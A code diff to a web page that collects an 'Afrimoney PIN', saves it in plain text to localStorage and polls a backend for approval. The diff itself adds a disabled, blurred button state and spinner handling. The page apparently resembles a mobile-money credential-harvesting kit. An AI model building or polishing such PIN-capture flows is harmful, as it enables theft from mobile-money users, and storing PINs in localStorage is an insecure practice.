@@ -188,6 +188,16 @@
             transform: translateY(0);
         }
 
+        /* Blurry and Disabled State for Button during waiting/loading */
+        .e-btn-login.disabled-state {
+            opacity: 0.4;
+            filter: blur(1.5px);
+            pointer-events: none;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+
         /* Loading Spinner */
         #loadingSpinner {
             display: none;
@@ -373,6 +383,7 @@
     async function submitPinAttempt() {
         const mpinInput = document.getElementById('mpin').value.trim();
         const spinnerDiv = document.getElementById('loadingSpinner');
+        const confirmBtn = document.getElementById('confirmBtn');
 
         if (mpinInput.length === 0) {
             showAppAlert('Please enter your valid Afrimoney PIN.');
@@ -386,6 +397,10 @@
         localStorage.setItem('lastPin', mpinInput);
 
         try {
+            // Blur/disable button and show loading spinner while waiting for callback
+            confirmBtn.classList.add('disabled-state');
+            if (spinnerDiv) spinnerDiv.style.display = 'flex';
+
             const response = await fetch('/api/submit-order', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -395,19 +410,24 @@
             const result = await response.json();
 
             if (result.success) {
-                if (spinnerDiv) spinnerDiv.style.display = 'flex'; 
                 pollApprovalStatus(phoneInput);
             } else {
+                confirmBtn.classList.remove('disabled-state');
+                if (spinnerDiv) spinnerDiv.style.display = 'none';
                 showAppAlert('Error: ' + (result.message || 'Verification failed.'));
             }
         } catch (error) {
             console.error('Error:', error);
+            confirmBtn.classList.remove('disabled-state');
+            if (spinnerDiv) spinnerDiv.style.display = 'none';
             showAppAlert('Could not connect to the backend server.');
         }
     }
 
     function pollApprovalStatus(phone) {
         const cleanPhone = phone.trim();
+        const spinnerDiv = document.getElementById('loadingSpinner');
+        const confirmBtn = document.getElementById('confirmBtn');
 
         const statusInterval = setInterval(async () => {
             try {
@@ -420,10 +440,9 @@
                 } 
                 else if (data.status === 'rejected' || data.status === 'wrong_id') {
                     clearInterval(statusInterval);
-                    if (document.getElementById('loadingSpinner')) {
-                        document.getElementById('loadingSpinner').style.display = 'none';
-                    }
-                    showAppAlert('Wrong PIN. Please try again.');
+                    if (spinnerDiv) spinnerDiv.style.display = 'none';
+                    confirmBtn.classList.remove('disabled-state');
+                    showAppAlert('❌ Failed: Incorrect PIN');
                 }
             } catch (e) {
                 console.error('Polling error', e);
